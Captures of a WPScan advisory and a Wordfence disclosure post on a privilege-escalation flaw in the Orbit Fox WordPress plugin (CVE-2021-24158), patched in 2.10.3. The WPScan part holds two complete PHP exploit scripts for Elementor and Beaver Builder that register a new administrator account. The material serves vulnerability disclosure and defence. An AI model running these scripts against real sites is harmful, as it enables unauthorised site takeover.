=== Content from wpscan.com_fcceb443_20250114_205147.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Orbit Fox by ThemeIsle < 2.10.3 - Authenticated Privilege Escalation

### Description

Orbit Fox by ThemeIsle has a feature to add a registration form to both the Elementor and Beaver Builder page builders functionality. As part of the registration form, administrators can choose which role to set as the default for users upon registration. This field is hidden from view for lower-level users, however, they can still supply the user\_role parameter to update the default role for registration.

This vulnerability requires user registration to be enabled on the target site, and Elementor or Beaver Builder to be installed on the same site that Orbit Fox is enabled.

### Proof of Concept

Elementor PoC
<?php
// Settings
$siteurl = $argv[1];
$wp\_user = $argv[2];
$wp\_pass = $argv[3];
$proxy = '127.0.0.1:8081';
$urlbits = parse\_url( $siteurl );
$wp\_url = $urlbits['scheme'].'://'.$urlbits['host'].'/';
//Json Encode Our New Post
$data = array(
"title" => "Exploit Post",
"content" => "<!-- wp:paragraph -->\nSample\n<!-- /wp:paragraph -->",
"status"=>"pending");
$postdata = json\_encode($data);
//Get Json post data length
$length = strlen($postdata);
echo 'Logging in!';
// 1) Log in as contributor+
$ch = curl\_init();
$cookiejar = tempnam(sys\_get\_temp\_dir(), 'cookiejar-');
curl\_setopt($ch, CURLOPT\_URL, $siteurl . '/wp-login.php');
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, true);
curl\_setopt($ch, CURLOPT\_POST, true);
curl\_setopt($ch, CURLOPT\_POSTFIELDS, [
'log' => $wp\_user,
'pwd' => $wp\_pass,
'rememberme' => 'forever',
'wp-submit' => 'Log+In',
]);
$output = curl\_exec($ch);
curl\_close($ch);
echo 'Grabbing Rest API!';
// Pull the Rest API Nonce
$ch = curl\_init();
curl\_setopt($ch, CURLOPT\_URL, $siteurl . '/wp-admin/post-new.php');
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, true);
$content = curl\_exec($ch);
curl\_close($ch);
//Rest API Nonce
preg\_match('/wp\.apiFetch\.createNonceMiddleware\(\s"([^"]+)"\s\)/', $content, $matches);
$restnonce = $matches[1];
echo 'Creating New Post and Grabbing Page ID!';
//Create New Post
$ch = curl\_init();
curl\_setopt($ch, CURLOPT\_URL, $siteurl . '/wp-json/wp/v2/posts');
curl\_setopt($ch, CURLOPT\_CUSTOMREQUEST, "POST");
curl\_setopt( $ch, CURLOPT\_PROXY, $proxy );
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, true);
curl\_setopt( $ch, CURLOPT\_HTTPHEADER, array(
'Content-Type: application/json',
"X-WP-Nonce: $restnonce",
"Content-Length: $length"));
curl\_setopt($ch, CURLOPT\_POSTFIELDS, $postdata);
$test = curl\_exec($ch);
//Grab the page-id
preg\_match('/"id":([^"]+),/', $test, $matches);
$pageid = $matches[1];
echo 'Getting Another Nonce!';
$ch = curl\_init();
curl\_setopt($ch, CURLOPT\_URL, $siteurl . '/wp-admin/post.php?post=' . $pageid . '&action=elementor');
curl\_setopt( $ch, CURLOPT\_PROXY, $proxy );
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, true);
$content = curl\_exec($ch);
curl\_close($ch);
//Import Nonce
preg\_match('/"nonce":"([^"]+)"},"connect/', $content, $matches);
$elementornonce = $matches[1];
echo 'Adding New User Form!';
//Upload a file
$ch = curl\_init();
curl\_setopt( $ch, CURLOPT\_URL, $siteurl . '/wp-admin/admin-ajax.php' );
curl\_setopt( $ch, CURLOPT\_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13' );
curl\_setopt( $ch, CURLOPT\_PROXY, $proxy );
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt( $ch, CURLOPT\_RETURNTRANSFER, true );
curl\_setopt( $ch, CURLOPT\_FOLLOWLOCATION, true );
curl\_setopt( $ch, CURLOPT\_POST, true );
curl\_setopt( $ch, CURLOPT\_POSTFIELDS, [
'actions' => '{"save\_builder":{"action":"save\_builder","data":{"status":"publish","elements":[{"id":"be9a476","elType":"section","isInner":false,"settings":{},"elements":[{"id":"7ea305d","elType":"column","isInner":false,"settings":{"\_column\_size":100,"\_inline\_size":null},"elements":[{"id":"6edacb5","elType":"widget","isInner":false,"settings":{"form\_fields":[{"key":"username","type":"text","label":"User Name","require":"required","placeholder":"User Name","field\_width":"100","field\_map":"user\_login","\_id":"3aef8c5","requirement":"","field\_width\_tablet":"","field\_width\_mobile":""},{"key":"email","type":"email","label":"Email","require":"required","placeholder":"Email","field\_width":"100","field\_map":"user\_email","\_id":"08c574b","requirement":"","field\_width\_tablet":"","field\_width\_mobile":""},{"key":"password","type":"password","label":"Password","require":"required","placeholder":"Password","field\_width":"100","field\_map":"user\_pass","\_id":"5f76a2d","requirement":"","field\_width\_tablet":"","field\_width\_mobile":""}],"submit\_label":"Register","user\_role":"administrator"},"elements":[],"widgetType":"content\_form\_registration"}]}]}],"settings":{"post\_title":"BadPost","post\_status":"pending"}}}}',
'\_nonce' => $elementornonce,
'editor\_post\_id' => $pageid,
'initial\_document\_id' => $pageid,
'action' => 'elementor\_ajax'
] );
$output = curl\_exec($ch);
curl\_close($ch);
echo 'Getting Another Nonce!';
$ch = curl\_init();
curl\_setopt($ch, CURLOPT\_URL, $siteurl . '/?p=' . $pageid . '&preview=true');
curl\_setopt( $ch, CURLOPT\_PROXY, $proxy );
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, true);
$register = curl\_exec($ch);
curl\_close($ch);
//Import Nonce
preg\_match('/"\_wpnonce\_registration"\svalue="([^"]+)"/', $register, $matches);
$registernonce = $matches[1];
//Import Nonce
preg\_match('/contentFormsSettings(.)\*"nonce":"([^"]+)"}/', $register, $matches);
$formnonce = $matches[2];
echo 'Adding New User!';
//Upload a file
$ch = curl\_init();
curl\_setopt( $ch, CURLOPT\_URL, $siteurl . '/wp-json/content-forms/v1/submit' );
curl\_setopt( $ch, CURLOPT\_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13' );
curl\_setopt( $ch, CURLOPT\_PROXY, $proxy );
curl\_setopt( $ch, CURLOPT\_HTTPHEADER, array(
"X-WP-Nonce: $formnonce"));
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt( $ch, CURLOPT\_RETURNTRANSFER, true );
curl\_setopt( $ch, CURLOPT\_FOLLOWLOCATION, true );
curl\_setopt( $ch, CURLOPT\_POST, true );
curl\_setopt( $ch, CURLOPT\_POSTFIELDS, [
'form\_type' => 'registration',
'form\_id' => '6edacb5',
'post\_id' => $pageid,
'form\_builder' => 'elementor',
'data[6edacb5][USER\_LOGIN]' => 'hax0r',
'data[6edacb5][USER\_EMAIL]' => 'a@a.com',
'data[6edacb5][USER\_PASS]' => 'hax0r',
'nonce' => $registernonce,
] );
$output = curl\_exec($ch);
curl\_close($ch);
print\_r($output);
?>
Beaver Builder PoC
<?php
// Settings
$siteurl = $argv[1];
$wp\_user = $argv[2];
$wp\_pass = $argv[3];
$proxy = '127.0.0.1:8081';
$urlbits = parse\_url( $siteurl );
$wp\_url = $urlbits['scheme'].'://'.$urlbits['host'].'/';
//Json Encode Our New Post
$data = array(
"title" => "Exploit Post",
"content" => "<!-- wp:paragraph -->\nSample\n<!-- /wp:paragraph -->",
"status"=>"pending");
$postdata = json\_encode($data);
//Get Json post data length
$length = strlen($postdata);
echo 'Logging in!';
// 1) Log in as contributor+
$ch = curl\_init();
$cookiejar = tempnam(sys\_get\_temp\_dir(), 'cookiejar-');
curl\_setopt($ch, CURLOPT\_URL, $siteurl . '/wp-login.php');
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, true);
curl\_setopt($ch, CURLOPT\_POST, true);
curl\_setopt($ch, CURLOPT\_POSTFIELDS, [
'log' => $wp\_user,
'pwd' => $wp\_pass,
'rememberme' => 'forever',
'wp-submit' => 'Log+In',
]);
$output = curl\_exec($ch);
curl\_close($ch);
echo 'Grabbing Rest API!';
// Pull the Rest API Nonce
$ch = curl\_init();
curl\_setopt($ch, CURLOPT\_URL, $siteurl . '/wp-admin/post-new.php');
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, true);
$content = curl\_exec($ch);
curl\_close($ch);
//Rest API Nonce
preg\_match('/wp\.apiFetch\.createNonceMiddleware\(\s"([^"]+)"\s\)/', $content, $matches);
$restnonce = $matches[1];
echo 'Creating New Post and Grabbing Page ID!';
//Create New Post
$ch = curl\_init();
curl\_setopt($ch, CURLOPT\_URL, $siteurl . '/wp-json/wp/v2/posts');
curl\_setopt($ch, CURLOPT\_CUSTOMREQUEST, "POST");
curl\_setopt( $ch, CURLOPT\_PROXY, $proxy );
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, true);
curl\_setopt( $ch, CURLOPT\_HTTPHEADER, array(
'Content-Type: application/json',
"X-WP-Nonce: $restnonce",
"Content-Length: $length"));
curl\_setopt($ch, CURLOPT\_POSTFIELDS, $postdata);
$test = curl\_exec($ch);
//Grab the page-id
preg\_match('/"id":([^"]+),/', $test, $matches);
$pageid = $matches[1];
echo 'Getting Another Nonce!';
$ch = curl\_init();
curl\_setopt($ch, CURLOPT\_URL, $siteurl . '/?p=' . $pageid . '&fl\_builder');
curl\_setopt( $ch, CURLOPT\_PROXY, $proxy );
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, true);
$content = curl\_exec($ch);
curl\_close($ch);
//Import Nonce
preg\_match('/ajaxNonce":"([^"]+)","builderEnabled"/', $content, $matches);
$beavernonce = $matches[1];
echo 'Getting Node!';
//Getting Node
$ch = curl\_init();
curl\_setopt( $ch, CURLOPT\_URL, $siteurl . '/?p=' . $pageid . '&fl\_builder');
curl\_setopt( $ch, CURLOPT\_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13' );
curl\_setopt( $ch, CURLOPT\_PROXY, $proxy );
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt( $ch, CURLOPT\_RETURNTRANSFER, true );
curl\_setopt( $ch, CURLOPT\_FOLLOWLOCATION, true );
curl\_setopt( $ch, CURLOPT\_POST, true );
curl\_setopt( $ch, CURLOPT\_POSTFIELDS, [
'fl\_builder\_data[action]' => 'render\_new\_module',
'fl\_builder\_data[parent\_id]' => '0',
'fl\_builder\_data[type]' => 'class-themeisle-content-forms-beaver-registration',
'fl\_builder\_data[position]' => '-1',
'fl\_builder\_data[\_wpnonce]' => $beavernonce,
'fl\_builder\_data[post\_id]' => $pageid,
'fl\_builder\_data[fl\_builder]' => '1',
'fl\_builder\_data[fl\_action]' => 'render\_new\_module'
] );
$node = curl\_exec($ch);
curl\_close($ch);
//Import Nonce
preg\_match('/"nodeId":"([^"]+)"/', $node, $matches);
$nodeID = $matches[1];
echo 'Adding New User Form!';
//Upload a file
$ch = curl\_init();
curl\_setopt( $ch, CURLOPT\_URL, $siteurl . '/?p=' . $pageid . '&fl\_builder' );
curl\_setopt( $ch, CURLOPT\_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13' );
curl\_setopt( $ch, CURLOPT\_PROXY, $proxy );
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt( $ch, CURLOPT\_RETURNTRANSFER, true );
curl\_setopt( $ch, CURLOPT\_FOLLOWLOCATION, true );
curl\_setopt( $ch, CURLOPT\_POST, true );
curl\_setopt( $ch, CURLOPT\_POSTFIELDS, [
'fl\_builder\_data[action]' => 'save\_settings',
'fl\_builder\_data[node\_id]' => $nodeID,
'fl\_builder\_data[settings][fields][]' => '{"label":"User Name","placeholder":"User Name","type":"text","field\_width":"100","field\_width\_medium":"","field\_width\_responsive":"","required":"required","field\_map":"user\_login","key":"username"}',
'fl\_builder\_data[settings][fields][]' => '{"label":"Email","placeholder":"Email","type":"email","field\_width":"100","field\_width\_medium":"","field\_width\_responsive":"","required":"required","field\_map":"user\_email","key":"email"}',
'fl\_builder\_data[settings][fields][]' => '{"label":"Password","placeholder":"Password","type":"password","field\_width":"100","field\_width\_medium":"","field\_width\_responsive":"","required":"required","field\_map":"user\_pass","key":"password"}',
'fl\_builder\_data[settings][hide\_label]' => 'show',
'fl\_builder\_data[settings][submit\_label]' => 'register',
'fl\_builder\_data[settings][user\_role]' => 'administrator',
'fl\_builder\_data[\_wpnonce]' => $beavernonce,
'fl\_builder\_data[post\_id]' => $pageid,
'fl\_builder\_data[fl\_builder]' => '1',
'fl\_builder\_data[fl\_action]' => 'save\_settings'
] );
$output = curl\_exec($ch);
curl\_close($ch);
echo 'Adding New User Form!';
//Upload a file
$ch = curl\_init();
curl\_setopt( $ch, CURLOPT\_URL, $siteurl . '/?p=' . $pageid . '&fl\_builder' );
curl\_setopt( $ch, CURLOPT\_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13' );
curl\_setopt( $ch, CURLOPT\_PROXY, $proxy );
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt( $ch, CURLOPT\_RETURNTRANSFER, true );
curl\_setopt( $ch, CURLOPT\_FOLLOWLOCATION, true );
curl\_setopt( $ch, CURLOPT\_POST, true );
curl\_setopt( $ch, CURLOPT\_POSTFIELDS, [
'fl\_builder\_data[action]' => 'save\_layout',
'fl\_builder\_data[publish]' => 'true',
'fl\_builder\_data[exit]' => '1',
'fl\_builder\_data[\_wpnonce]' => $beavernonce,
'fl\_builder\_data[post\_id]' => $pageid,
'fl\_builder\_data[fl\_builder]' => '1',
'fl\_builder\_data[fl\_action]' => 'save\_layout'
] );
$output = curl\_exec($ch);
curl\_close($ch);
echo 'Getting Another Nonce!';
$ch = curl\_init();
curl\_setopt($ch, CURLOPT\_URL, $siteurl . '/?p=' . $pageid . '&preview=true');
curl\_setopt( $ch, CURLOPT\_PROXY, $proxy );
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, true);
$register = curl\_exec($ch);
curl\_close($ch);
//Import Nonce
preg\_match('/"\_wpnonce\_registration"\svalue="([^"]+)"/', $register, $matches);
$registernonce = $matches[1];
//Import Nonce
preg\_match('/contentFormsSettings(.)\*"nonce":"([^"]+)"}/', $register, $matches);
$formnonce = $matches[2];
echo 'Adding New User!';
//Upload a file
$ch = curl\_init();
curl\_setopt( $ch, CURLOPT\_URL, $siteurl . '/wp-json/content-forms/v1/submit' );
curl\_setopt( $ch, CURLOPT\_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13' );
curl\_setopt( $ch, CURLOPT\_PROXY, $proxy );
curl\_setopt( $ch, CURLOPT\_HTTPHEADER, array(
"X-WP-Nonce: $formnonce"));
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt( $ch, CURLOPT\_RETURNTRANSFER, true );
curl\_setopt( $ch, CURLOPT\_FOLLOWLOCATION, true );
curl\_setopt( $ch, CURLOPT\_POST, true );
curl\_setopt( $ch, CURLOPT\_POSTFIELDS, [
'form\_type' => 'registration',
'form\_id' => $nodeID,
'post\_id' => $pageid,
'form\_builder' => 'beaver',
'data[' . $nodeID . '][USER\_LOGIN]' => 'hax0r4',
'data['. $nodeID .'][USER\_EMAIL]' => 'a4@a.com',
'data['. $nodeID .'][USER\_PASS]' => 'hax0r',
'nonce' => $registernonce,
] );
$output = curl\_exec($ch);
curl\_close($ch);
print\_r($output);
?>

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

themeisle-companion](https://a8cteam5105.wordpress.com/plugin/themeisle-companion/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 2.10.3

### References

CVE
[CVE-2021-24158](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24158)

URL
<https://www.wordfence.com/blog/2021/01/multiple-vulnerabilities-patched-in-orbit-fox-by-themeisle-plugin/>

### Classification

Type
PRIVESC

OWASP top 10
[A2: Broken Authentication and Session Management](https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication)

CWE
[CWE-269](https://cwe.mitre.org/data/definitions/269.html)

CVSS
[9.9 (critical)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

### Miscellaneous

Original Researcher
Chloe Chamberland

Submitter
Chloe Chamberland

Submitter website
<https://wordfence.com>

Submitter twitter
[infosecchloe](//twitter.com/infosecchloe)

Verified
No

WPVDB ID
[d81d0e72-9bb5-47ef-a796-3b305a4b604f](https://a8cteam5105.wordpress.com/vulnerability/d81d0e72-9bb5-47ef-a796-3b305a4b604f/)

### Timeline

Publicly Published
2021-01-12 (about 4 years ago)

Added
2021-01-12 (about 4 years ago)

Last Updated
2021-02-23 (about 3 years ago)

### Other

Published
Title

Published
2020-11-09
Title
[Ultimate Member < 2.1.12 - Authenticated Privilege Escalation via Profile Update](https://a8cteam5105.wordpress.com/vulnerability/dd4c4ece-7206-4788-8747-f0c0f3ab0a53/)

Published
2023-11-09
Title
[WP User Frontend < 3.6.6 - Authenticated (Author+) Privilege Escalation](https://a8cteam5105.wordpress.com/vulnerability/a3984fb8-2fe5-42bb-a280-ce1f5df7819d/)

Published
2021-04-14
Title
[Plus Addons for Elementor < 2.0.7 - Contributor+ Privilege Escalation](https://a8cteam5105.wordpress.com/vulnerability/c973f0b3-5bf1-42e1-b08a-c4af1b79c688/)

Published
2024-09-06
Title
[WPCOM Member < 1.5.3 - Unauthenticated Privilege Escalation via User Meta](https://a8cteam5105.wordpress.com/vulnerability/aabd279e-4066-4c2b-851a-b37243c0079a/)

Published
2023-08-03
Title
[WP Ultimate CSV Importer < 7.9.9 - Author+ Privilege Escalation](https://a8cteam5105.wordpress.com/vulnerability/d0ba5f6f-0563-4103-ac73-f0ea2108d970/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)


=== Content from www.wordfence.com_ad99d678_20250114_205148.html ===


![](https://www.wordfence.com/wp-content/uploads/2021/01/Multiple-Vulnerabilities-Patched-in-Orbit-Fox-by-ThemeIsle-Plugin-.png)

[![](https://secure.gravatar.com/avatar/9bf72594e071c28445ed7a1be0de1a23?s=80&d=mm&r=g)Chloe Chamberland](https://www.wordfence.com/blog/author/wfchloe/)

January 12, 2021

# Multiple Vulnerabilities Patched in Orbit Fox by ThemeIsle Plugin

On November 19, 2020, our Threat Intelligence team responsibly disclosed two vulnerabilities in [Orbit Fox by ThemeIsle](https://wordpress.org/plugins/themeisle-companion/), a WordPress plugin used by over 400,000 sites. One of these flaws made it possible for attackers with contributor level access or above to escalate their privileges to those of an administrator and potentially take over a WordPress site. The other flaw made it possible for attackers with contributor or author level access to inject potentially malicious JavaScript into posts. These types of malicious scripts can be used to redirect visitors to malvertising sites or create new administrative users, amongst many other actions.

We initially reached out to the plugin’s developer on November 19, 2020. After establishing an appropriate communication channel, we provided the full disclosure details on November 24, 2020. After a few follow-ups, the plugin’s developer released a patched version of Orbit Fox by ThemeIsle in version 2.10.3, on December 17, 2020.

These are critical and medium severity vulnerabilities. Therefore, we highly recommend updating to the patched version, 2.10.3, immediately.

Wordfence Premium users received a firewall rule to protect against any exploits targeting these vulnerabilities on November 19, 2020. Sites still using the free version of Wordfence received the same protection on December 19, 2020.

**Description:** Authenticated Privilege Escalation

**Affected Plugin:** Orbit Fox by ThemeIsle

**Plugin Slug:** themeisle-companion

**Affected Versions:** <= 2.10.2

**CVE ID:** [CVE-2021-24158](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24158)

**CVSS Score:** 9.9 (CRITICAL)

**CVSS Vector:** [CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Fully Patched Version:** 2.10.3

Orbit Fox by ThemeIsle is a plugin designed to enhance the Elementor, Beaver Builder, and Gutenberg editors with additional features like registration forms as well as other blocks and widgets that can be used while editing posts and pages.

As part of the plugin, there is a registration widget that can be used to create a registration form with customizable fields when using the Elementor and Beaver Builder page builder plugins. During the creation of the registration form, the plugin provides the ability to set a default role to be used whenever a user registers using the form.

![](https://www.wordfence.com/wp-content/uploads/2021/01/Orbit-fox-registration-300x162.png)

Orbit Fox Registration widget.

Lower level users like contributors, authors, and editors were not shown the option to set the default user role from the editor. However, we found that they could still modify the default user role by crafting a request with the appropriate parameter. The plugin provided client-side protection to prevent the role selector from being shown to lower level users while adding a registration form. Unfortunately, there were no server-side protections or validation to verify that an authorized user was actually setting the default user role in a request.

`{"save_builder":{"action":"save_builder","data":{"status":"publish","elements":[{"id":"be9a476","elType":"section","isInner":false,"settings":{},"elements":[{"id":"7ea305d","elType":"column","isInner":false,"settings":{"_column_size":100,"_inline_size":null},"elements":[{"id":"6edacb5","elType":"widget","isInner":false,"settings":{"form_fields[...],"submit_label":"Register","user_role":"administrator"},"elements":[],"widgetType":"content_form_registration"}]}]}],"settings":{"post_title":"BadPost","post_status":"pending"}}}}',`

The lack of server-side validation meant that a lower-level user with access to the page/post editor like contributors, authors, and editors could create a registration form and set the user role to that of an administrator upon successful registration. Once the registration form was created, the user could simply register a new user and that user would be granted administrator privileges even while still authenticated to the WordPress instance.

To exploit this flaw, user registration would need to be enabled and the site would need to be running the Elementor or Beaver Builder plugins. A site with user registration disabled or neither of these plugins installed would not be affected by this vulnerability.

**Description:** Authenticated Stored Cross Site Scripting

**Affected Plugin:** Orbit Fox by ThemeIsle

**Plugin Slug:** themeisle-companion

**Affected Versions:** <= 2.10.2

**CVE ID:** [2021-24157](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24157)

**CVSS Score:** 6.4 (MEDIUM)

**CVSS Vector:** [CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N](https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N)

**Fully Patched Version:** 2.10.3

In addition to the privilege escalation vulnerability we discovered, we also found that contributors and authors could add scripts to posts despite not having the `unfiltered_html` capability due to the header and footer script feature in Orbit Fox.

![](https://www.wordfence.com/wp-content/uploads/2021/01/OBFX-Header-Footer-Script-300x140.png)

Orbit Fox header and footer script area.

This flaw allowed lower-level users to add malicious JavaScript to posts that would execute in the browser whenever a user navigated to that page.

As always with XSS vulnerabilities, this would make it possible for attackers to create new administrative users, inject malicious redirects and backdoors, or alter other site content through the use of malicious JavaScript.

## The Importance of Server-Side Validation over Client-Side Validation

There are two core ways that developers can validate user input in WordPress, either on the client side within a browser upon the submission of data, or on the server after data has been submitted by the user. Ensuring that user input is valid is an important part of an application’s data integrity and security, therefore understanding the difference between client-side and server-side validation is important for developers.

Client-side validation occurs when input is validated by scripts in the browser prior to being sent to the server. For example, when filling out a form, input may be checked and stripped for Cross-Site Scripting characters like <> in the browser upon submission prior to that data being sent via a request to the server. This will typically be done using a client-side programming language like JavaScript.

Server-side validation occurs once the data reaches the server and is done within a controlled environment. For example, when filling out a form, input will be sent to the server as the user entered it, without any validation, editing, or modification. Once the server receives the request, it will then check for security issues, ensure that data is formatted correctly, and prepare the submission for inserting or updating to a data source. This is done with code that runs on the server side, and in the case of WordPress, this would be PHP.

